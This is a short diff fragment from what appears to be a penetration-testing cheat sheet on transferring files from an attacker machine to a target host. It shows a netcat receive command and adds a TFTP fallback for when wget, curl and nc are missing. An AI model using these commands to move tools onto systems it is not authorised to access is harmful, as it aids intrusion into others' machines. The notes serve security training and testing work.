@@ -17,3 +17,8 @@ On attacker
 On target
 
     nc 192.168.1.102 1234 > file
+
+if wget/curl/nc are all not available, TFTP can be used
+
+    tftp 192.168.0.101
+    tftp> get myfile.txt
